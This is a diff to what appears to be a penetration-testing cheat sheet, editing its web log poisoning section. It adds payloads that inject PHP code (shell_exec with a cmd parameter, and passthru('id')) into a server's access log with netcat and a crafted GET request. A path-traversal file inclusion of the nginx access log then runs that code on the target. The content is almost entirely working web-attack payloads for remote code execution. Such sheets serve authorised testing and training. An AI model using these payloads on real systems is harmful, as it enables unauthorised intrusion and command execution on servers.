@@ -3986,6 +3986,12 @@ $ go install github.com/tomnomnom/waybackurls@latest
 
 ## Web Log Poisoning
 
+### Web Shell
+
+```c
+$ nc <RHOST> 80
+```
+
 ```c
 GET /<?php echo shell_exec($_GET['cmd']); ?> HTTP/1.1
 Host: <RHOST>
@@ -3993,7 +3999,23 @@ Connection: close
 ```
 
 ```c
-http://<RHOST>/view.php?page=../../../../../var/log/apache2/access.log&cmd=id
+http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log&cmd=id
+```
+
+### Code Execution
+
+```c
+$ nc <RHOST> 80
+```
+
+```c
+GET /<?php passthru('id'); ?> HTTP/1.1
+Host: <RHOST>
+Connection: close
+```
+
+```c
+http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log
 ```
 
 ## Wfuzz
